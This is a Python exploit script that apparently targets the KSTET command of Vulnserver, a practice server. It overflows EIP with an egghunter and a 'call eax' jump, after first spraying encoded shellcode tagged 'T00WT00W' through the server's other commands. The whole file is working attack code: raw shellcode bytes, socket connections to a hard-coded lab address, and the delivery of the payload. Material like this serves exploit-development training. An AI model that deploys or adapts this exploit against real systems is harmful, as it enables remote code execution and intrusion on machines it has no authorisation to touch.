#!/usr/bin/env python
#KSTET EIP overflow
#Tested on Vista Enterprise SP2 32-bit and Windows 7 Professional SP1 32-bit

import socket
import time

IPADDR = '192.168.10.136'
PORT = 9999
BUFFER_SIZE = 1024

EGG = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
NOPS = "A" * 8

#0x625015b1 call eax
buffer = "KSTET " + NOPS + EGG + "A" * (70 - len(EGG) - len(NOPS)) + "\xb1\x15\x50\x62" +  "/.:/" + "C" * 4500 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IPADDR, PORT))
time.sleep(2)

buf =  ""
buf += "\xda\xd1\xbe\xaa\xe8\xa7\xc6\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x31\x72\x17\x83\xc2\x04\x03\xd8\xfb\x45"
buf += "\x33\xe0\x14\x0b\xbc\x18\xe5\x6c\x34\xfd\xd4\xac\x22"
buf += "\x76\x46\x1d\x20\xda\x6b\xd6\x64\xce\xf8\x9a\xa0\xe1"
buf += "\x49\x10\x97\xcc\x4a\x09\xeb\x4f\xc9\x50\x38\xaf\xf0"
buf += "\x9a\x4d\xae\x35\xc6\xbc\xe2\xee\x8c\x13\x12\x9a\xd9"
buf += "\xaf\x99\xd0\xcc\xb7\x7e\xa0\xef\x96\xd1\xba\xa9\x38"
buf += "\xd0\x6f\xc2\x70\xca\x6c\xef\xcb\x61\x46\x9b\xcd\xa3"
buf += "\x96\x64\x61\x8a\x16\x97\x7b\xcb\x91\x48\x0e\x25\xe2"
buf += "\xf5\x09\xf2\x98\x21\x9f\xe0\x3b\xa1\x07\xcc\xba\x66"
buf += "\xd1\x87\xb1\xc3\x95\xcf\xd5\xd2\x7a\x64\xe1\x5f\x7d"
buf += "\xaa\x63\x1b\x5a\x6e\x2f\xff\xc3\x37\x95\xae\xfc\x27"
buf += "\x76\x0e\x59\x2c\x9b\x5b\xd0\x6f\xf4\xa8\xd9\x8f\x04"
buf += "\xa7\x6a\xfc\x36\x68\xc1\x6a\x7b\xe1\xcf\x6d\x7c\xd8"
buf += "\xa8\xe1\x83\xe3\xc8\x28\x40\xb7\x98\x42\x61\xb8\x72"
buf += "\x92\x8e\x6d\xd4\xc2\x20\xde\x95\xb2\x80\x8e\x7d\xd8"
buf += "\x0e\xf0\x9e\xe3\xc4\x99\x35\x1e\x8f\x65\x61\x2a\xcc"
buf += "\x0e\x70\x2a\xd3\x75\xfd\xcc\xb9\x99\xa8\x47\x56\x03"
buf += "\xf1\x13\xc7\xcc\x2f\x5e\xc7\x47\xdc\x9f\x86\xaf\xa9"
buf += "\xb3\x7f\x40\xe4\xe9\xd6\x5f\xd2\x85\xb5\xf2\xb9\x55"
buf += "\xb3\xee\x15\x02\x94\xc1\x6f\xc6\x08\x7b\xc6\xf4\xd0"
buf += "\x1d\x21\xbc\x0e\xde\xac\x3d\xc2\x5a\x8b\x2d\x1a\x62"
buf += "\x97\x19\xf2\x35\x41\xf7\xb4\xef\x23\xa1\x6e\x43\xea"
buf += "\x25\xf6\xaf\x2d\x33\xf7\xe5\xdb\xdb\x46\x50\x9a\xe4"
buf += "\x67\x34\x2a\x9d\x95\xa4\xd5\x74\x1e\xd4\x9f\xd4\x37"
buf += "\x7d\x46\x8d\x05\xe0\x79\x78\x49\x1d\xfa\x88\x32\xda"
buf += "\xe2\xf9\x37\xa6\xa4\x12\x4a\xb7\x40\x14\xf9\xb8\x40"

#Cycles through available commands in an attempt to store our shellcode prepended with our egghunter keyword.
for i in ["HELP ", "GDOG ", "HTER ", "LTER ", "KSTAN ", "TRUN ", "STATS ", "RTIME ", "LTIME ", "SRUN ", "GMON "]:
	print "Attempting to store shellcode in " + (i) 	
	con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	con.connect((IPADDR,PORT))
	time.sleep(1)
	SHELL = "T00WT00W" + "\x90" * 20 + buf 
	con.send(SHELL)
	data = con.recv(BUFFER_SIZE)
	con.close()
s.send(buffer)
data = s.recv(BUFFER_SIZE)
s.close()
print "Buffer sent"
